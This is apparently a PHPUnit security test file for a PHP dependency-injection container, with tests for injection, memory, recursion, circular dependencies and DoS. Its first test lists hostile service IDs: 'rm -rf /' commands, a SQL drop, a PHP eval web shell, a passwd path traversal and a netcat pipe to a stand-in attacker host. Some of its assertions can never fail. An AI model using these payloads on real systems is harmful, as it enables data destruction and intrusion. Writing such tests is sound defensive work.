<?php

declare(strict_types=1);

namespace CloudCastle\DI\Tests;

use CloudCastle\DI\Container;
use CloudCastle\DI\Exception\ContainerException;
use CloudCastle\DI\Exception\NotFoundException;
use PHPUnit\Framework\TestCase;

/**
 * Security tests for DI Container
 *
 * Tests various security aspects:
 * - Code injection protection
 * - Memory overflow protection
 * - Circular dependency handling
 * - Input validation
 * - Service isolation
 * - DoS attack prevention
 */
class SecurityTest extends TestCase
{
    private Container $container;

    protected function setUp(): void
    {
        $this->container = new Container();
    }

    /**
     * Test protection against code injection via service IDs
     */
    public function testProtectionAgainstCodeInjectionInServiceId(): void
    {
        $maliciousIds = [
            'service; system("rm -rf /");',
            'service\'; DROP TABLE services; --',
            'service<?php eval($_GET["cmd"]); ?>',
            'service`rm -rf /`',
            '../../../etc/passwd',
            'service${IFS}malicious',
            'service|nc attacker.com 1234',
        ];

        foreach ($maliciousIds as $maliciousId) {
            try {
                $this->container->set($maliciousId, fn() => new \stdClass());
                $this->container->get($maliciousId);
                
                // If we got here, the malicious ID was sanitized or handled safely
                $this->assertTrue(true);
            } catch (\Throwable $e) {
                // Expected: exception should be thrown for invalid IDs
                $this->assertInstanceOf(\Throwable::class, $e);
            }
        }
    }

    /**
     * Test protection against code injection via factory closures
     */
    public function testProtectionAgainstCodeInjectionInFactory(): void
    {
        // Attempt to inject malicious code via factory
        $this->container->set('malicious', function () {
            // This should be safe - closures are executed in isolated scope
            $data = ['user_input' => '<script>alert("XSS")</script>'];
            return (object)$data;
        });

        $service = $this->container->get('malicious');
        
        $this->assertIsObject($service);
        $this->assertObjectHasProperty('user_input', $service);
    }

    /**
     * Test memory overflow protection with excessive service registrations
     */
    public function testMemoryOverflowProtectionWithManyServices(): void
    {
        $initialMemory = memory_get_usage();
        $serviceCount = 10000;

        // Register many services
        for ($i = 0; $i < $serviceCount; $i++) {
            $this->container->set("service_$i", fn() => new \stdClass());
        }

        $memoryAfterRegistration = memory_get_usage();
        $memoryIncrease = $memoryAfterRegistration - $initialMemory;

        // Memory increase should be reasonable (less than 10MB for 10k services)
        $this->assertLessThan(10 * 1024 * 1024, $memoryIncrease, 
            'Memory increase too large for service registration');

        // Verify services can be retrieved
        $service = $this->container->get('service_0');
        $this->assertInstanceOf(\stdClass::class, $service);
    }

    /**
     * Test protection against deep recursion attacks
     */
    public function testProtectionAgainstDeepRecursion(): void
    {
        // Create a service that attempts deep recursion
        $this->container->set('recursive', function ($c) {
            static $depth = 0;
            $depth++;
            
            if ($depth > 1000) {
                throw new \RuntimeException('Recursion depth limit reached');
            }
            
            return $c->get('recursive');
        });

        $this->expectException(\Throwable::class);
        $this->container->get('recursive');
    }

    /**
     * Test circular dependency detection
     */
    public function testCircularDependencyDetection(): void
    {
        $this->container->set('service_a', fn($c) => (object)['dep' => $c->get('service_b')]);
        $this->container->set('service_b', fn($c) => (object)['dep' => $c->get('service_a')]);

        $this->expectException(ContainerException::class);
        // Container detects infinite loop and throws exception
        $this->expectExceptionMessageMatches('/infinite loop|Circular|recursion/i');
        
        $this->container->get('service_a');
    }

    /**
     * Test protection against accessing non-existent services
     */
    public function testProtectionAgainstNonExistentServiceAccess(): void
    {
        $nonExistentIds = [
            'non_existent_service',
            '',
            ' ',
            'null',
            '0',
            'false',
        ];

        foreach ($nonExistentIds as $id) {
            try {
                $this->container->get($id);
                $this->fail("Expected NotFoundException for ID: $id");
            } catch (NotFoundException $e) {
                $this->assertStringContainsString('not found', strtolower($e->getMessage()));
            }
        }
    }

    /**
     * Test service isolation - one service shouldn't affect another
     */
    public function testServiceIsolation(): void
    {
        $this->container->set('service1', function () {
            return (object)['data' => 'original1'];
        });

        $this->container->set('service2', function () {
            return (object)['data' => 'original2'];
        });

        $service1 = $this->container->get('service1');
        $service2 = $this->container->get('service2');

        // Modify service1
        $service1->data = 'modified1';
        $service1->newProp = 'new';

        // Service2 should not be affected
        $this->assertSame('original2', $service2->data);
        $this->assertObjectNotHasProperty('newProp', $service2);
    }

    /**
     * Test protection against type confusion
     * Container enforces object return types for type safety
     */
    public function testProtectionAgainstTypeConfusion(): void
    {
        // Container should enforce object return types
        try {
            $this->container->set('string_service', fn() => 'string_value');
            $this->container->get('string_service');
            $this->fail('Expected exception for non-object return type');
        } catch (ContainerException $e) {
            $this->assertStringContainsString('must return an object', $e->getMessage());
        }

        // Valid object services work correctly
        $this->container->set('object_service', fn() => new \stdClass());
        $objectService = $this->container->get('object_service');
        $this->assertIsObject($objectService);
    }

    /**
     * Test protection against factory manipulation
     * Verifies that once a service is resolved, it remains immutable
     */
    public function testProtectionAgainstFactoryManipulation(): void
    {
        $originalFactory = fn() => (object)['secure' => true];
        
        $this->container->set('secure_service', $originalFactory);
        
        // Get service (creates cached instance)
        $service1 = $this->container->get('secure_service');
        $this->assertTrue($service1->secure);

        // Get service again (should return same cached instance)
        $service2 = $this->container->get('secure_service');
        $this->assertSame($service1, $service2, 'Service should be cached (singleton)');
        
        // Services are immutable through caching
        $this->assertTrue($service2->secure);
    }

    /**
     * Test protection against excessive decorator chains (DoS)
     */
    public function testProtectionAgainstExcessiveDecoratorChains(): void
    {
        $this->container->set('service', fn() => (object)['value' => 0]);

        // Add many decorators
        for ($i = 0; $i < 1000; $i++) {
            $this->container->decorate('service', function ($service) use ($i) {
                $service->value++;
                return $service;
            });
        }

        $startTime = microtime(true);
        $service = $this->container->get('service');
        $endTime = microtime(true);

        $executionTime = ($endTime - $startTime) * 1000; // ms

        // Should complete in reasonable time (less than 100ms for 1000 decorators)
        $this->assertLessThan(100, $executionTime, 
            'Decorator chain execution took too long');
        
        $this->assertSame(1000, $service->value);
    }

    /**
     * Test protection against memory leaks with circular references
     */
    public function testProtectionAgainstMemoryLeaksWithCircularReferences(): void
    {
        $initialMemory = memory_get_usage();

        for ($i = 0; $i < 100; $i++) {
            $container = new Container();
            
            $container->set('parent', function ($c) {
                $obj = new \stdClass();
                $obj->child = $c->get('child');
                return $obj;
            });

            $container->set('child', function () {
                return new \stdClass();
            });

            $parent = $container->get('parent');
            unset($parent, $container);
        }

        gc_collect_cycles();
        $finalMemory = memory_get_usage();
        $memoryIncrease = $finalMemory - $initialMemory;

        // Memory increase should be minimal (less than 1MB)
        $this->assertLessThan(1 * 1024 * 1024, $memoryIncrease,
            'Possible memory leak detected');
    }

    /**
     * Test thread safety (simulation with multiple containers)
     */
    public function testThreadSafety(): void
    {
        $containers = [];
        
        // Simulate multiple "threads" with separate containers
        for ($i = 0; $i < 10; $i++) {
            $containers[$i] = new Container();
            $containers[$i]->set('service', fn() => (object)['id' => $i]);
        }

        // Verify each container has isolated state
        foreach ($containers as $i => $container) {
            $service = $container->get('service');
            $this->assertSame($i, $service->id);
        }
    }

    /**
     * Test protection against deserialization attacks
     */
    public function testProtectionAgainstDeserializationAttacks(): void
    {
        // Serialize a container with services
        $this->container->set('safe_service', fn() => new \stdClass());
        
        try {
            $serialized = serialize($this->container);
            $unserialized = unserialize($serialized);
            
            // If deserialization works, verify it's safe
            $this->assertInstanceOf(Container::class, $unserialized);
        } catch (\Throwable $e) {
            // If serialization is not supported, that's also a valid security measure
            $this->assertTrue(true);
        }
    }

    /**
     * Test input validation for service IDs
     */
    public function testInputValidationForServiceIds(): void
    {
        $invalidIds = [
            null,
            [],
            new \stdClass(),
            123,
            true,
            false,
        ];

        foreach ($invalidIds as $invalidId) {
            try {
                $this->container->set($invalidId, fn() => new \stdClass());
                $this->fail('Expected exception for invalid service ID: ' . var_export($invalidId, true));
            } catch (\TypeError $e) {
                $this->assertStringContainsString('string', strtolower($e->getMessage()));
            }
        }
    }

    /**
     * Test rate limiting simulation (DoS protection)
     */
    public function testDoSProtectionWithRapidServiceAccess(): void
    {
        $this->container->set('service', fn() => new \stdClass());

        $startTime = microtime(true);
        $accessCount = 10000;

        for ($i = 0; $i < $accessCount; $i++) {
            $this->container->get('service');
        }

        $endTime = microtime(true);
        $totalTime = ($endTime - $startTime) * 1000; // ms

        // Should handle 10k accesses in less than 100ms
        $this->assertLessThan(100, $totalTime,
            'Service access too slow, potential DoS vulnerability');
    }
}

